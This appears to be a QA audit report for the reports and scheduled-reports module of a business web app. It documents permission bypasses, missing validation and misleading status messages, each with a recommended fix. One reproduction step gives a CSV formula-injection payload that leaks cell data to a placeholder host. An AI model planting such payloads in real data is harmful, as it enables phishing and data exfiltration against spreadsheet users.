# QA — Reports (Reports / BI, Scheduled Reports) -t

| Module | Matrix section | Bug ID prefix | Tested | Confirmed Bugs | Potential Bugs | Manual Verification |
| --- | --- | --- | --- | --- | --- | --- |
| Reports (Reports / BI, Scheduled Reports) | 7.2–7.3 | BUG-RPT | Yes | 7 | 2 | 6 |

Source of test cases: `QA_TEST_MATRIX.md`. Method: static trace of the actual implementation (React UI → service → Axios → .NET controller → service/repository → EF Core → SQL Server, and back). No application code, configuration or database is changed during QA. Findings that depend on deployed configuration, data or a real browser go under **Needs Manual Verification**.

Severity scale:
- **Critical**: security breach, data corruption, financial corruption, or a blocked core workflow.
- **High**: a major feature is broken or a significant security control is bypassed, with a workaround that is hard or unavailable.
- **Medium**: a feature works incorrectly in specific conditions, or a security control is weaker than configured.
- **Low**: cosmetic, minor UX, or an informational/hardening issue.

---

## Confirmed Bugs

### BUG-RPT-001 — "All sites" scheduled reports run tenant-wide and bypass the creator's site restriction

**Severity:** High. A site-restricted user can have data for every site, including financial statements, emailed to any address on a recurring basis; this bypasses the site restriction that the interactive Reports page enforces.

**Status:** Confirmed

**Test Area:** Permissions / Location / Tenant isolation

**Description:** When a schedule is created or updated with no site ("All sites"), `TryResolveListLocationFilter` accepts the null location for a restricted user, the schedule is stored with `LocationId = null`, and at run time `ReportAttachmentBuilder` calls the report builders with only that null location and no `restrictToLocationIds`. The interactive `ReportsController` path passes the restricted site list, so the same user cannot see those numbers on screen. The matrix records "operational schedules ignore the user's site restriction" as the current behaviour, which conflicts with the location filter applied by `GenerateReport`.

**Steps to Reproduce:**
1. Log in as a user assigned only to Site A in a tenant with Sites A and B.
2. On `/reports`, generate "Sales by Customer" with All sites; note that only Site A data is shown.
3. Click Schedule, keep the site as All sites, enter your own email and save.
4. On `/reports/schedules`, click Run now and open the emailed attachment.

**Expected:** The emailed report contains only Site A data (the sites the creator can access), the same as the interactive report.

**Actual:** The attachment contains Site A and Site B data. Financial types (for example, balance sheet) are also produced tenant-wide.

**Evidence:**
- Frontend: `Cimmple_UI/src/Common/Components/ScheduleReportDialog.tsx` (`handleSave`, lines 124–201) sends `locationId` only when a site is chosen.
- Backend: `Controllers/ReportScheduleController.cs` lines 94–96 and 126–128 (`TryResolveListLocationFilter(entity.LocationId, …)` accepts null); `MapToEntity` lines 211–213 sets `LocationId = null` for ≤ 0. `Services/ReportAttachmentBuilder.cs` lines 92–123 call the operational builders with only `schedule.LocationId` and no restricted-site list; lines 150–160 build financial types tenant-wide. Compare `Controllers/ReportsController.cs` line 56 (`TryResolveListLocationFilter` with restricted sites applied to `GenerateReport`).
- Database: `ReportSchedules.LocationId` is nullable; nothing stores the creator's allowed sites.

**Root Cause:** The schedule does not capture or re-apply the creator's site restriction at execution time.

**Business Impact:** Confidential sales, cost and financial data of other sites can be exfiltrated by email by users who should not see it.

**Affected Areas:** Scheduled Reports (all operational and financial report types), Run now.

**Recommended Fix:** For restricted users, reject "All sites" or store the allowed site list with the schedule (or the creator id) and pass `restrictToLocationIds` to the builders at run time; re-check the creator's current access before each run.

---

### BUG-RPT-002 — Schedule by-id endpoints do not check site access

**Severity:** Medium. A restricted user can read, change, run or delete another site's schedule within the same tenant, although the list hides it.

**Status:** Confirmed

**Test Area:** Permissions / Location

**Description:** `GET /ReportSchedules` filters by site, but `GET /{id}`, `PUT /{id}`, `PATCH /{id}/enabled`, `DELETE /{id}` and `POST /{id}/run` only check the tenant. Schedule ids are sequential integers.

**Steps to Reproduce:**
1. As a Site B user, create a schedule (note its id from the network tab, for example 12).
2. Log in as a Site A-only user; confirm the schedule is not listed.
3. Call `POST /api/ReportSchedules/12/run` or `DELETE /api/ReportSchedules/12` with the Site A user's token.

**Expected:** 403 or 404, consistent with the list filter.

**Actual:** The schedule runs (emailing Site B data to the stored recipients) or is deleted.

**Evidence:**
- Frontend: `Cimmple_UI/src/Modules/Reports/ScheduledReports.tsx` only shows listed schedules, so the gap is reachable through the API.
- Backend: `ReportScheduleController.cs` list filter at lines 36–57; `Get` lines 66–75, `Update` lines 112–140, `SetEnabled` lines 142–157, `Delete` lines 159–171, `RunNow` lines 174–188 (tenant check only, no `CanAccessLocation`).
- Database: `ReportSchedules` keyed by identity id.

**Root Cause:** Location access is applied to the list query but not to single-record operations.

**Business Impact:** Cross-site tampering with or triggering of schedules.

**Affected Areas:** Scheduled Reports.

**Recommended Fix:** Load the schedule and call `CanAccessLocation(schedule.LocationId)` (treat null as tenant-wide, allowed only for unrestricted users) in every by-id action.

---

### BUG-RPT-003 — Recipient email addresses are never validated

**Severity:** Medium. A typo silently breaks a recurring report; the user is told the schedule saved and later that it is "Queued (sending)", while delivery fails in the outbox.

**Status:** Confirmed

**Test Area:** Validation

**Description:** The matrix requires "Recipients valid email". The dialog only checks that the To field is not empty, and the server only checks that splitting on `,`/`;` yields at least one entry. CC is not validated at all. Invalid addresses are only detected when MailKit parses them during delivery.

**Steps to Reproduce:**
1. Open Schedule on `/reports` and enter `john.doe@` (or `abc`) as recipient.
2. Save, then click Run now on `/reports/schedules`.

**Expected:** The dialog (and the API) reject the invalid address with a clear message.

**Actual:** The schedule is saved, Run now shows "Report generated and emailed", and the outbox row fails repeatedly until it is marked Failed.

**Evidence:**
- Frontend: `ScheduleReportDialog.tsx` lines 129–132 (only `!toEmails.trim()` is checked).
- Backend: `Services/ReportScheduleTiming.cs` `ValidateScheduleFields` lines 180–221 (lines 186–187 only check that the split list is non-empty); `Services/EmailService.cs` `SplitAddresses` lines 190–201 (no format check) and `MailboxAddress.Parse` at lines 158 and 160 (throws at send time); `Services/EmailOutboxService.cs` lines 192–212 (retries then Failed).
- Database: `ReportSchedules.ToEmails` / `CcEmails` store any string.

**Root Cause:** No email format validation at either layer.

**Business Impact:** Recipients silently stop receiving scheduled reports.

**Affected Areas:** Schedule create/edit, Run now, hosted service runs.

**Recommended Fix:** Validate each To and CC address on the client and in `ValidateScheduleFields` (for example with `MailboxAddress.TryParse`) and list the invalid entries in the error.

---

### BUG-RPT-004 — Last-run status and Run-now message claim success even when the email is never delivered

**Severity:** Medium. Users cannot tell that scheduled reports are failing.

**Status:** Confirmed

**Test Area:** Business Logic / Error handling

**Description:** The execution service marks the schedule "Queued" as soon as the email is placed in the outbox and never updates it with the outbox result. The list shows "Queued (sending)" indefinitely, and Run now shows "Report generated and emailed" although the server only queued it. Outbox failures (bad SMTP settings, invalid recipients, notifications disabled later) are not reflected anywhere on the Scheduled Reports page.

**Steps to Reproduce:**
1. Configure an SMTP password that is wrong in System Settings.
2. Click Run now on a schedule.
3. Wait for the outbox to exhaust its retries and reload `/reports/schedules`.

**Expected:** The schedule shows a failed delivery (or at least not a success), and Run now says the report was queued.

**Actual:** The toast says "Report generated and emailed"; the status stays "Queued (sending)".

**Evidence:**
- Frontend: `ScheduledReports.tsx` line 79 (`toast.success("Report generated and emailed")`) and lines 199–206 ("Queued (sending)").
- Backend: `Services/ReportScheduleExecutionService.cs` lines 106–116 (`LastRunStatus = "Queued"` after enqueue); `EmailOutboxService.cs` lines 192–212 mark the outbox row Failed with no link back to the schedule.
- Database: `EmailOutbox` has no schedule reference; `ReportSchedules.LastRunStatus` is never updated after enqueue.

**Root Cause:** No feedback path from the outbox to the schedule.

**Business Impact:** Reports silently stop arriving; issues surface only when a recipient complains.

**Affected Areas:** Scheduled Reports list and Run now.

**Recommended Fix:** Store the outbox id on the schedule run (or a run history table) and update the status to Sent/Failed from the outbox processor; change the Run-now toast to "queued for delivery".

---

### BUG-RPT-005 — CSV exports are open to spreadsheet formula injection

**Severity:** Medium. A user-entered name beginning with `=`, `+`, `-` or `@` executes as a formula when the export is opened in Excel.

**Status:** Confirmed

**Test Area:** API / Security

**Description:** Server CSV output and the client-side CSV fallback only quote values containing commas, quotes or newlines. Values that start with formula characters are written unchanged. Customer, vendor, part and description fields are free text entered by users (and by vendors through the vendor portal).

**Steps to Reproduce:**
1. Create a customer named `=HYPERLINK("http://example.com?x="&A1,"Click")`.
2. Invoice the customer, then export "Sales by Customer" as CSV from `/reports`.
3. Open the file in Excel.

**Expected:** The name is shown as text (for example, prefixed with `'`).

**Actual:** Excel evaluates the cell as a formula.

**Evidence:**
- Frontend: `Cimmple_UI/src/Modules/Reports/BusinessIntelligence.tsx` `convertReportToCsv` lines 311–362 (same escaping rule).
- Backend: `Services/OperationalReportExportService.cs` `Escape` lines 305–310; used for every row (for example lines 80–143); `ReportsController.cs` lines 204–213 return the CSV.
- Database: Names are stored as entered.

**Root Cause:** CSV escaping does not neutralise leading formula characters.

**Business Impact:** Recipients of exported or scheduled CSVs (often external accountants) can be phished or have data exfiltrated by crafted cell formulas.

**Affected Areas:** Reports CSV export, scheduled CSV attachments.

**Recommended Fix:** Prefix values that start with `=`, `+`, `-`, `@`, tab or carriage return with a single quote (and quote the field) in both escape functions.

---

### BUG-RPT-006 — Export failures show a generic Axios message instead of the server error

**Severity:** Low. The user loses the reason for the failure (for example, "You do not have access to this location").

**Status:** Confirmed

**Test Area:** Error handling

**Description:** The export request uses `responseType: "blob"`, so error bodies arrive as a `Blob`. The catch block reads `error.response.data.error`, which is undefined on a `Blob`, and falls back to `error.message` ("Request failed with status code 403"). The JSON check on the success path does not help for HTTP errors. Other screens (`DocumentService.toDownloadError`) already parse Blob errors correctly.

**Steps to Reproduce:**
1. As a Site A-only user, select Site B in the export payload (or trigger any 400/403/500 from `GenerateReport` with format PDF/CSV).
2. Click Export.

**Expected:** The toast shows the server's message.

**Actual:** The toast shows "Request failed with status code 403".

**Evidence:**
- Frontend: `BusinessIntelligence.tsx` `exportReport` lines 635–691 (JSON check at line 648; error message at lines 685–687); `Common/Services/ReportsService.ts` `DownloadReport` uses `responseType: "blob"`.
- Backend: `ReportsController.cs` returns `{ error }` JSON for 400/403/500 (for example line 220).
- Database: N/A.

**Root Cause:** Blob error bodies are not read and parsed.

**Business Impact:** Users cannot self-diagnose export problems.

**Affected Areas:** Reports export (PDF/CSV).

**Recommended Fix:** In the catch block, if `error.response.data` is a `Blob`, read it with `.text()`, parse JSON and show `error`/`message`.

---

### BUG-RPT-007 — Schedule dialog accepts a custom end date before the start date

**Severity:** Low. The server silently swaps the dates, but the email body prints them reversed and the user is not told.

**Status:** Confirmed

**Test Area:** Validation

**Description:** The Reports page rejects a custom range where start is after end, but `ScheduleReportDialog` only checks that both dates are filled. The server accepts any parseable pair; the date helper swaps them when building the report, and the email body prints the stored order.

**Steps to Reproduce:**
1. Open Schedule, choose Custom, start 2026-09-30, end 2026-09-01, and save.
2. Run now and read the email.

**Expected:** The dialog shows the same "start must be before end" validation as the Reports page.

**Actual:** The schedule saves; the email reads "Period: Custom (2026-09-30 → 2026-09-01)".

**Evidence:**
- Frontend: `ScheduleReportDialog.tsx` line 134 (presence check only); compare `BusinessIntelligence.tsx` lines 555–566 (order check on the Reports page).
- Backend: `ReportScheduleTiming.cs` lines 212–218 (parse check only); `Services/ReportDateRangeHelper.cs` lines 19–20 (silent swap); `ReportScheduleExecutionService.cs` lines 63–66 (prints stored order).
- Database: Reversed strings stored in `ReportSchedules.CustomStartDate/CustomEndDate`.

**Root Cause:** Validation differs between the Reports page and the schedule dialog.

**Business Impact:** Confusing report periods for recipients.

**Affected Areas:** Schedule create/edit.

**Recommended Fix:** Add the start ≤ end check in the dialog and in `ValidateScheduleFields`.

---

## Potential Bugs

### BUG-RPT-008 — A schedule can be sent twice when Run now overlaps the hosted service or when several API instances run

**Severity:** Medium. Duplicate emails of financial reports to external recipients.

**Status:** Potential

**Test Area:** Business Logic / Concurrency

**Description:** The hosted service polls every 30 seconds, selects due schedules, builds and enqueues them, then advances `NextRunUtc`. There is no row lock, claim column or concurrency token, and Run now uses the same execution path without coordination. Two API instances (scale-out or a deployment slot swap) or a Run now during a due tick can process the same schedule twice.

**Steps to Reproduce:**
1. Run two API instances against the same database.
2. Create a schedule due in one minute.
3. Check the outbox when it fires.

**Expected:** One email per scheduled run.

**Actual:** Two outbox rows can be created for the same run.

**Evidence:**
- Frontend: N/A.
- Backend: `Services/ReportScheduleExecutionService.cs` lines 106–128 (status and next-run updates after the work, with no claim); `ReportScheduleController.cs` `RunNow` lines 174–188.
- Database: `ReportSchedules` has no lock or version column.

**Root Cause:** No idempotency or claim step.

**Business Impact:** Duplicate or confusing deliveries.

**Affected Areas:** Scheduled Reports.

**Recommended Fix:** Claim each due schedule atomically (for example, an `UPDATE … WHERE NextRunUtc = @old` check) before generating.

**Why further verification is needed:** Depends on deployment topology (number of instances) and timing.

---

### BUG-RPT-009 — Interactive report periods use the server clock while scheduled reports use the tenant time zone

**Severity:** Low. "This Month"/"This Week" can differ by a day between the screen and the scheduled email near midnight or month end.

**Status:** Potential

**Test Area:** Business Logic

**Description:** `ReportsController.GetDateRangeFilter` uses `DateTime.Now` (server time), whereas `ReportAttachmentBuilder` resolves the same named ranges with the tenant's local time. On a UTC host, a US tenant generating "This Month" on the evening of the last day gets the next month on screen but the current month by email.

**Steps to Reproduce:**
1. Set the tenant time zone to America/Los_Angeles on a UTC server.
2. On the last day of a month after 17:00 local time, generate "This Month" on screen and Run now for a "This Month" schedule.

**Expected:** Both use the same period.

**Actual:** The periods can differ.

**Evidence:**
- Frontend: N/A.
- Backend: `ReportsController.cs` lines 228–229 (`DateTime.Now`); `ReportAttachmentBuilder.cs` lines 42–47 (tenant-local "as of").
- Database: N/A.

**Root Cause:** Two different clocks for the same named ranges.

**Business Impact:** Report totals that do not match between screen and email.

**Affected Areas:** Reports / BI, Scheduled Reports.

**Recommended Fix:** Resolve named ranges with the tenant time zone in `ReportsController` as well.

**Why further verification is needed:** Depends on the server time zone of the deployed host.

---

## Needs Manual Verification

1. **Area:** Responsive (matrix rows "`/reports`; drawer and tables on phone" and "`/reports/schedules`; edit dialog (Esc)").
   **What to Test:** Open `/reports`, generate a wide report, open the drill-down drawer, and open the schedule dialog at 375/390/430 px; press Esc on the dialog.
   **Expected:** Tables scroll horizontally inside their container; the drawer and dialog fit; Esc closes the dialog.
   **Why Manual Testing Is Required:** `BusinessIntelligence.scss` has a single 960 px breakpoint and `ScheduledReports` has no breakpoint; actual layout and the global Esc handler must be checked in a browser (see also `QA_PWA.md` BUG-PWA-001).

2. **Area:** Drill-down deep links.
   **What to Test:** For each drillable report type, click rows in `OperationalReportDrillDrawer` (25 per page) and follow the deep link.
   **Expected:** The target module opens the correct record or filter.
   **Why Manual Testing Is Required:** Statically `reportDeepLink.ts` maps every drillable type to an existing route with `?open=`, but landing on the right record needs data.

3. **Area:** Report totals versus modules.
   **What to Test:** Compare several report types with the source module lists for the same range and site.
   **Expected:** Totals match.
   **Why Manual Testing Is Required:** Data-dependent.

4. **Area:** PDF export rendering.
   **What to Test:** Export long and wide reports as PDF.
   **Expected:** Columns fit; page breaks repeat headers; non-ASCII names render.
   **Why Manual Testing Is Required:** QuestPDF layout must be viewed.

5. **Area:** Weekly/monthly schedule timing across DST.
   **What to Test:** Create weekly and monthly schedules around a DST change and month ends (31st).
   **Expected:** Runs at the configured local time.
   **Why Manual Testing Is Required:** `ReportScheduleTiming.ComputeNextRunUtc` looks correct statically, but needs runtime confirmation.

6. **Area:** Email notifications disabled.
   **What to Test:** Turn off email notifications in System Settings and let a schedule fire.
   **Expected:** The schedule shows a clear failure reason.
   **Why Manual Testing Is Required:** Outcome depends on how the enqueue rejection is surfaced at run time.

## No Issues Found

- `GenerateReport` applies `TryResolveListLocationFilter`, returning 403 for an explicitly chosen site the user cannot access and limiting "All sites" to the allowed sites for restricted users.
- Report builders use an exclusive next-day end (`endDate.Date.AddDays(1)`), so the last day of the period is included.
- Report services use LINQ only (no raw SQL), so report filters are not injectable.
- Changing any report parameter clears the preview, so an export cannot silently reflect stale parameters.
- `ComputeNextRunUtc` handles daily, weekly (chosen weekday) and monthly (clamped day of month) schedules with time-zone conversion.
- The schedule dialog close button has `aria-label="Close"`, which the global Esc handler (`installGlobalEscapeToClose`) uses.
- Enable/Disable, Delete (with confirmation) and Run now call the documented endpoints and refresh the list.
- The Scheduled Reports page has no search, sort or pagination. The 7.3 Frontend row says "Client", but section 9 marks Scheduled Reports as Search P, Sort P, Pagination –, so this is not logged as a defect.

## QA Coverage

| Test Area | Tested | Result |
| --- | --- | --- |
| Navigation | Yes | Pass |
| CRUD | Yes | Fail (BUG-RPT-002) |
| Search | Yes | N/A |
| Filters | Yes | Pass |
| Sorting | Yes | N/A |
| Pagination | Yes | Pass |
| Validation | Yes | Fail (BUG-RPT-003, BUG-RPT-007) |
| Permissions | Yes | Fail (BUG-RPT-001, BUG-RPT-002) |
| API | Yes | Fail (BUG-RPT-005, BUG-RPT-006) |
| Database | Yes | Potential (BUG-RPT-008) |
| Business Logic | Yes | Fail (BUG-RPT-004); Potential (BUG-RPT-009) |
| Location | Yes | Fail (BUG-RPT-001, BUG-RPT-002) |
| Tenant | Yes | Pass (see Cross-Module Concerns) |
| Cross-Module | Partial | Manual |
| Responsive/PWA | Partial | Manual |

## Matrix Checklist

| Matrix Row | Result | Notes |
| --- | --- | --- |
| 7.2 FE View — `BusinessIntelligence.tsx` category tabs | Pass | Tabs and preview wired to `GenerateReport`. |
| 7.2 FE Filter — date range, location, customer/vendor | Pass | Custom range validated; location validated server-side. |
| 7.2 FE Drill-down — drawer (25/page), `reportDeepLink.ts` | Manual | Manual Verification item 2. |
| 7.2 FE Export — PDF/CSV blob | Fail (BUG-RPT-005, BUG-RPT-006) | Formula injection; generic error message. |
| 7.2 FE Schedule — `ScheduleReportDialog` → POST `/ReportSchedules` | Fail (BUG-RPT-001, BUG-RPT-003, BUG-RPT-007) | — |
| 7.2 FE Permissions / Responsive — `/reports` on phone | Manual | Manual Verification item 1. |
| 7.2 BE Generate — ~30 types; `request.TenantId` overrides | Pass (see Cross-Module Concerns) | Tenant override logged as cross-module concern (a). |
| 7.2 BE Authorization — authenticated; location filter | Pass | `TryResolveListLocationFilter` applied. |
| 7.2 Cross-module — drill-down lands on right record | Manual | Manual Verification item 2. |
| 7.3 FE List — GET `/ReportSchedules` | Pass | List is site-filtered. |
| 7.3 FE Search / Sort / Pagination — Client | N/A | Not implemented; section 9 marks Search P, Sort P, Pagination –. |
| 7.3 FE Add / Edit — POST / PUT | Fail (BUG-RPT-001, BUG-RPT-003, BUG-RPT-007) | — |
| 7.3 FE Enable/Disable — PATCH | Fail (BUG-RPT-002) | Works from the UI; by-id endpoint lacks site check. |
| 7.3 FE Run now — POST run | Fail (BUG-RPT-002, BUG-RPT-004) | Misleading success message. |
| 7.3 FE Delete — DELETE | Fail (BUG-RPT-002) | — |
| 7.3 FE Validation — recipients valid email; frequency fields; report type | Fail (BUG-RPT-003) | Frequency and report type are validated server-side. |
| 7.3 FE Permissions / Responsive — edit dialog (Esc) | Manual | Esc wiring present; layout under Manual Verification item 1. |
| 7.3 BE CRUD — hosted service (30s), EmailOutbox | Fail (BUG-RPT-004); Potential (BUG-RPT-008) | — |
| 7.3 BE Authorization — operational schedules ignore site restriction | Fail (BUG-RPT-001) | Documented behaviour conflicts with the interactive location filter. |

## Cross-Module Concerns

| Concern | Owner file | Evidence |
| --- | --- | --- |
| `GenerateReport` trusts `request.TenantId` from the body before the token tenant; `ReportsService.ts` sends `tenantId` from localStorage. | `QA_TenantLocationFramework.md` (client-supplied `tenantId`) | `Controllers/ReportsController.cs` line 38. |
| Financial report types (balance sheet, P&L, and so on) can be generated and scheduled by any authenticated user; there is no server-side role check. | `QA_RolesPermissions.md` (no server-side role enforcement) | `ReportsController.cs`; `ReportScheduleController.cs`; `ReportAttachmentBuilder.cs` lines 150–160. |
